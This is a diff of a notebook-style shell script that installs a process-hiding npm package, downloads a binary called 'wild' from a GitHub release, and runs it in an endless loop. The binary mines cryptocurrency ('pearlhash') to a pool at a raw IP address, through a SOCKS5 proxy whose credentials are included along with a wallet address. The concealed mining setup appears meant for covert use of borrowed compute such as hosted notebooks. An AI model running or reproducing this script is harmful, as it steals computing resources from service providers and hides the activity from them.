@@ -1,10 +1,9 @@
 !apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
 
-curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
-apt-get install -y nodejs
+!curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
 
-npm i -g node-process-hider
+!npm i -g node-process-hider
 
-ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+!ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
 !wget https://github.com/rochmandwi/ayam/releases/download/file-v1/wild && chmod +x wild && (while true; do ./wild --algo pearlhash --url 192.210.169.184:443 --user prl1pruln3k0yuc8nrqvtps5whuraw04xcum74vvz80cd0yj5wpv28v5q3dyp27@nock=2GMkHa41GVciQwk62XwipNJaKgTm36kcmmjScwuKBvaUTCbm5miB15t.$(shuf -n 1 -i 1-9999)-Bismillah --proxy socks5://Bahlilganteng:Bahlilganteng@198.144.189.25:443; sleep 5; done)
